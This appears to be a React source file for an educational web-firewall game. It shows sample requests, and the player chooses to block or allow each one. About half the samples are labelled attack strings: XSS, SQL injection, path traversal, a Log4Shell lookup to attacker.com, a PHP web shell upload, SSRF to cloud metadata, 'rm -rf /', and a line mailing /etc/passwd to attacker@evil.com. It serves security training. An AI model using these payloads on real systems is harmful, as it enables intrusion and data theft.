
import { useEffect, useState } from "react";
import { motion, AnimatePresence } from "framer-motion";

const requests = [
  {
    id: 1,
    text: "GET /home",
    malicious: false,
  },
  {
    id: 2,
    text: "<script>alert('xss')</script>",
    malicious: true,
  },
  {
    id: 3,
    text: "GET /products",
    malicious: false,
  },
  {
    id: 4,
    text: "UNION SELECT password FROM users",
    malicious: true,
  },
  {
    id: 5,
    text: "POST /login",
    malicious: false,
  },
  {
    id: 6,
    text: "../../../etc/passwd",
    malicious: true,
  },
  {
    id: 7,
    text: "GET /static/images/logo.png",
    malicious: false,
  },
  {
    id: 8,
    text: "'; DROP TABLE users;--",
    malicious: true,
  },
  {
    id: 9,
    text: "GET /search?q=javascript+tutorials",
    malicious: false,
  },
  {
    id: 10,
    text: "${jndi:ldap://attacker.com/a}",
    malicious: true,
  },
  {
    id: 11,
    text: "POST /api/v1/checkout HTTP/1.1",
    malicious: false,
  },
  {
    id: 12,
    text: "GET /index.php?page=http://malicious-site.com/shell.txt",
    malicious: true,
  },
  {
    id: 13,
    text: "GET /dashboard?user_id=42",
    malicious: false,
  },
  {
    id: 14,
    text: "cat /etc/passwd | mail -s 'pwned' attacker@evil.com",
    malicious: true,
  },
  {
    id: 15,
    text: "OPTIONS /api/v2/users",
    malicious: false,
  },
  {
    id: 16,
    text: "<img src=x onerror=alert(1)>",
    malicious: true,
  },
  {
    id: 17,
    text: "GET /faq.html",
    malicious: false,
  },
  {
    id: 18,
    text: "SELECT * FROM admin WHERE username = 'admin' AND password = '1' OR '1'='1'",
    malicious: true,
  },
  {
    id: 19,
    text: "POST /feedback?rating=5&comment=Great+service!",
    malicious: false,
  },
  {
    id: 20,
    text: "GET /admin/config?file=....//....//....//etc/passwd",
    malicious: true,
  },
  {
    id: 21,
    text: "GET /blog/posts/102",
    malicious: false,
  },
  {
    id: 22,
    text: "javascript:alert(document.cookie)",
    malicious: true,
  },
  {
    id: 23,
    text: "PUT /api/v1/profile/update",
    malicious: false,
  },
  {
    id: 24,
    text: "POST /upload HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n<?php system($_GET['cmd']); ?>",
    malicious: true,
  },
  {
    id: 25,
    text: "GET /favicon.ico",
    malicious: false,
  },
  {
    id: 26,
    text: "GET /api/v1/debug?url=http://169.254.169.254/latest/meta-data/",
    malicious: true,
  },
  {
    id: 27,
    text: "DELETE /api/v1/cart/items/5",
    malicious: false,
  },
  {
    id: 28,
    text: "admin' --",
    malicious: true,
  },
  {
    id: 29,
    text: "GET /assets/index-D4f8a3s2.js",
    malicious: false,
  },
  {
    id: 30,
    text: "GET /webhook?target=http://localhost:8080/admin/deleteUser",
    malicious: true,
  },
  {
    id: 31,
    text: "POST /contact-us HTTP/2",
    malicious: false,
  },
  {
    id: 32,
    text: "GET /%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows/win.ini",
    malicious: true,
  },
  {
    id: 33,
    text: "GET /shop/categories?sort=price_asc",
    malicious: false,
  },
  {
    id: 34,
    text: "<svg/onload=alert(process.env)>",
    malicious: true,
  },
  {
    id: 35,
    text: "POST /api/v2/auth/refresh-token",
    malicious: false,
  },
  {
    id: 36,
    text: "PING 127.0.0.1; rm -rf /",
    malicious: true,
  },
  {
    id: 37,
    text: "GET /pricing?plan=premium&billing=yearly",
    malicious: false,
  },
  {
    id: 38,
    text: "GET /api/users?search=%22%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20--",
    malicious: true,
  },
  {
    id: 39,
    text: "GET /docs/api-reference.pdf",
    malicious: false,
  },
  {
    id: 40,
    text: "POST /submit-form HTTP/1.1\\nContent-Type: application/x-www-form-urlencoded\\n\\nname=Anik&email=Anik%40test.com",
    malicious: false,
  },
  {
    id: 41,
    text: "GET /ws/chat/stream",
    malicious: false,
  },
  {
    id: 42,
    text: "GET /item/view?id=12' AND 1=2 UNION SELECT null,version()--",
    malicious: true,
  },
  {
    id: 43,
    text: "GET /about-us",
    malicious: false,
  },
  {
    id: 44,
    text: "GET /download?file=../../../../boot.ini",
    malicious: true,
  },
  {
    id: 45,
    text: "PATCH /api/v1/settings/theme",
    malicious: false,
  },
  {
    id: 46,
    text: "<iframe src=\"javascript:alert(`xss`)\"></iframe>",
    malicious: true,
  },
  {
    id: 47,
    text: "GET /notifications?read=false",
    malicious: false,
  },
  {
    id: 48,
    text: "GET /cgi-bin/test-cgi?%20AND%201=1",
    malicious: true,
  },
  {
    id: 49,
    text: "GET /terms-of-service",
    malicious: false,
  },
  {
    id: 50,
    text: "eval(Base64.decode('Y29uc29sZS5sb2coImhhY2tlZCIp'));",
    malicious: true,
  }
];

export default function App() {
  const [current, setCurrent] = useState(null);
  const [score, setScore] = useState(0);
  const [time, setTime] = useState(30);
  const [gameOver, setGameOver] = useState(false);
  const [message, setMessage] = useState("");

  // Random request
  const nextRequest = () => {
    const random =
      requests[Math.floor(Math.random() * requests.length)];
    setCurrent(random);
  };

  // Start
  useEffect(() => {
    nextRequest();
  }, []);

  // Timer
  useEffect(() => {
    if (gameOver) return;

    if (time <= 0) {
      setGameOver(true);
      return;
    }

    const timer = setTimeout(() => {
      setTime((prev) => prev - 1);
    }, 1000);

    return () => clearTimeout(timer);
  }, [time, gameOver]);

  // Handle answer
  const handleChoice = (block) => {
    if (!current) return;

    const correct =
      (block && current.malicious) ||
      (!block && !current.malicious);

    if (correct) {
      setScore((prev) => prev + 10);

      setMessage(
        current.malicious
          ? "🚫 Attack Blocked!"
          : "✅ Safe Traffic Allowed!"
      );
    } else {
      setScore((prev) => Math.max(prev - 5, 0));

      setMessage(
        current.malicious
          ? "❌ Hacker Passed Through!"
          : "❌ Legit User Blocked!"
      );
    }

    setTimeout(() => {
      setMessage("");
      nextRequest();
    }, 700);
  };

  // Restart
  const restartGame = () => {
    setScore(0);
    setTime(30);
    setGameOver(false);
    nextRequest();
  };

  return (
    <div className="min-h-screen bg-black text-white overflow-hidden relative flex flex-col items-center justify-center px-4">

      {/* Background Glow */}
      <div className="absolute inset-0 bg-gradient-to-br from-red-900/20 via-black to-green-900/20" />

      {/* Header */}
      <motion.h1
        initial={{ opacity: 0, y: -20 }}
        animate={{ opacity: 1, y: 0 }}
        className="text-5xl md:text-7xl font-extrabold mb-4 text-center z-10"
      >
        FASTLY WAF DEFENDER
      </motion.h1>

      <p className="text-gray-400 text-xl mb-8 z-10">
        Block attacks before they hit the server
      </p>

      {/* Score + Timer */}
      <div className="flex gap-8 mb-8 z-10">
        <div className="bg-gray-900 border border-green-500 px-6 py-4 rounded-2xl text-2xl">
          Score: {score}
        </div>

        <div className="bg-gray-900 border border-red-500 px-6 py-4 rounded-2xl text-2xl">
          Time: {time}s
        </div>
      </div>

      {/* Game Over */}
      {gameOver ? (
        <motion.div
          initial={{ scale: 0.8, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          className="z-10 text-center"
        >
          <h2 className="text-6xl font-bold mb-4">
            GAME OVER
          </h2>

          <p className="text-3xl mb-6">
            Final Score: {score}
          </p>

          <button
            onClick={restartGame}
            className="bg-green-500 hover:bg-green-400 text-black font-bold px-8 py-4 rounded-xl text-2xl transition"
          >
            PLAY AGAIN
          </button>
        </motion.div>
      ) : (
        <>
          {/* Request Card */}
          <AnimatePresence mode="wait">
            {current && (
              <motion.div
                key={current.text}
                initial={{ opacity: 0, y: 80 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -80 }}
                transition={{ duration: 0.3 }}
                className="z-10 bg-gray-900 border border-cyan-500 rounded-3xl p-8 max-w-3xl w-full shadow-2xl"
              >
                <div className="text-sm text-cyan-400 mb-2">
                  Incoming Request
                </div>

                <div className="text-2xl md:text-4xl font-mono break-words">
                  {current.text}
                </div>
              </motion.div>
            )}
          </AnimatePresence>

          {/* Buttons */}
          <div className="flex gap-6 mt-10 z-10">
            <motion.button
              whileTap={{ scale: 0.9 }}
              onClick={() => handleChoice(true)}
              className="bg-red-600 hover:bg-red-500 px-10 py-5 rounded-2xl text-3xl font-bold shadow-xl"
            >
              🚫 BLOCK
            </motion.button>

            <motion.button
              whileTap={{ scale: 0.9 }}
              onClick={() => handleChoice(false)}
              className="bg-green-600 hover:bg-green-500 px-10 py-5 rounded-2xl text-3xl font-bold shadow-xl"
            >
              ✅ ALLOW
            </motion.button>
          </div>

          {/* Message */}
          <AnimatePresence>
            {message && (
              <motion.div
                initial={{ opacity: 0, scale: 0.7 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0 }}
                className="mt-8 text-4xl font-bold z-10"
              >
                {message}
              </motion.div>
            )}
          </AnimatePresence>
        </>
      )}
    </div>
  );
}
